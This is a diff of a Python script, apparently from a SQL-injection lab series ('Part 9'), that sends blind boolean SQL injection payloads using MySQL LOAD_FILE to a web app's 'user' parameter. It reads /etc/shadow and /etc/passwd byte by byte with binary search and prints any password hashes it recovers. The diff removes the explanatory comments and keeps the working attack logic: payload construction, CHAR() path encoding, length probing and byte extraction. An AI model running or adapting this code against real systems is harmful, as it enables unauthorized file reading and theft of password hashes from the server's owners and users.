@@ -1,22 +1,3 @@
-# Part 9 - Attempt to read /etc/shadow (or similar sensitive files) via Blind SQLi + LOAD_FILE.
-#
-# Strategy:
-#   MySQL's LOAD_FILE() can read arbitrary files IF the DB user has the FILE privilege
-#   AND the file is readable by the OS user running MySQL.
-#
-#   /etc/shadow is owned by root and readable only by root (or shadow group).
-#   MySQL typically runs as the 'mysql' OS user, so LOAD_FILE('/etc/shadow') will return
-#   NULL — the query silently fails and we get an empty result.
-#
-#   /etc/passwd is world-readable, so we use it as a control to confirm LOAD_FILE works
-#   at all. If even passwd returns empty, the MySQL user lacks the FILE privilege entirely.
-#
-# How this helps:
-#   - If LOAD_FILE succeeds on /etc/shadow → we dump the hashed passwords.
-#   - If it fails only on /etc/shadow but works on /etc/passwd → we know FILE works but
-#     the OS permissions block shadow (the most common outcome).
-#   - If both fail → the MySQL user has no FILE privilege at all.
-
 import time
 import requests
 from requests.adapters import HTTPAdapter
@@ -37,7 +18,7 @@ _session.mount("http://", _adapter)
 
 
 def _get(params: dict) -> requests.Response:
-    """GET with retry + brief back-off on RemoteDisconnected."""
+    # GET with retry + brief back-off on RemoteDisconnected.# 
     for attempt in range(5):
         try:
             return _session.get(URL, params=params, cookies=MY_COOKIES, timeout=10)
@@ -48,7 +29,7 @@ def _get(params: dict) -> requests.Response:
 
 
 def path_to_char(path: str) -> str:
-    """Encode a file path as SQL CHAR(...) to avoid quote-escaping issues."""
+    # Encode a file path as SQL CHAR(...) to avoid quote-escaping issues.# 
     return "CHAR(" + ",".join(str(ord(c)) for c in path) + ")"
 
 
@@ -60,7 +41,7 @@ def check_connection() -> bool:
 
 
 def file_is_readable(path: str) -> bool:
-    """Return True if LOAD_FILE returns a non-NULL result for the given path."""
+    # Return True if LOAD_FILE returns a non-NULL result for the given path.
     path_char = path_to_char(path)
     payload = f"alice' AND LOAD_FILE({path_char}) IS NOT NULL #"
     res = _get({'user': payload})
@@ -68,7 +49,7 @@ def file_is_readable(path: str) -> bool:
 
 
 def get_file_length(path_char: str) -> int:
-    """Binary-search for the exact byte length of the file (0 = unreadable/empty)."""
+    # Binary-search for the exact byte length of the file (0 = unreadable/empty).
     res = _get({'user': f"alice' AND LENGTH(LOAD_FILE({path_char}))>0 #"})
     if TRUE_INDICATOR not in res.text:
         return 0
@@ -85,7 +66,7 @@ def get_file_length(path_char: str) -> int:
 
 
 def read_byte_bsearch(path_char: str, pos: int) -> int:
-    """Binary-search the byte value at position `pos` (1-based). 8 requests per byte."""
+    # Binary-search the byte value at position `pos` (1-based). 8 requests per byte.
     lo, hi = 0, 255
     while lo < hi:
         mid = (lo + hi) // 2
@@ -99,7 +80,7 @@ def read_byte_bsearch(path_char: str, pos: int) -> int:
 
 
 def read_file(path: str) -> bytes:
-    """Read a file via blind boolean SQLi using binary search (8 req/byte)."""
+    # Read a file via blind boolean SQLi using binary search (8 req/byte).
     path_char = path_to_char(path)
 
     print(f"  Checking readability of {path!r} ... ", end='', flush=True)
@@ -134,10 +115,8 @@ def main():
         print("Cannot reach the server. Aborting.")
         return
 
-    # ----------------------------------------------------------------
-    # Step 1: the real target — /etc/shadow
-    # ----------------------------------------------------------------
-    print("\n[Step 1] Attempting to read /etc/shadow")
+    # the real target — /etc/shadow
+    print("\nAttempting to read /etc/shadow")
     shadow_data = read_file("/etc/shadow")
     if shadow_data:
         print(f"\n  SUCCESS! /etc/shadow ({len(shadow_data)} bytes):")
@@ -145,29 +124,16 @@ def main():
         print("\n  Hex dump:")
         print(shadow_data.hex())
     else:
-        print("\n  RESULT: /etc/shadow returned NULL (unreadable).")
-        print("  Explanation:")
-        print("    /etc/shadow is owned by root with mode 640 (readable only")
-        print("    by root / the 'shadow' group). MySQL runs as the 'mysql'")
-        print("    OS user, which is not in that group, so the kernel refuses")
-        print("    the open() call and LOAD_FILE() returns NULL.")
+        print("\n  FAILED: /etc/shadow returned NULL (unreadable).")
 
-    # ----------------------------------------------------------------
-    # Step 2: control test — /etc/passwd (world-readable, confirms FILE
-    #         privilege is present; the failure above is OS permissions,
-    #         not a missing FILE privilege)
-    # ----------------------------------------------------------------
-    print("\n[Step 2] Control test: /etc/passwd (world-readable)")
+    # /etc/passwd (world readable)
+    print("\n/etc/passwd (world-readable)")
     passwd_data = read_file("/etc/passwd")
     if passwd_data:
         print(f"\n  /etc/passwd ({len(passwd_data)} bytes):")
         print(passwd_data.decode("latin-1", errors="replace"))
-        print("\n  Conclusion: LOAD_FILE works — the MySQL user has the FILE")
-        print("  privilege. /etc/shadow failed purely because of OS-level")
-        print("  permissions, not a missing SQL privilege.")
     else:
-        print("\n  RESULT: /etc/passwd is also unreadable.")
-        print("  Conclusion: the MySQL user lacks the FILE privilege entirely.")
+        print("\n  FAILED: /etc/passwd is also unreadable.")
 
 
 if __name__ == "__main__":
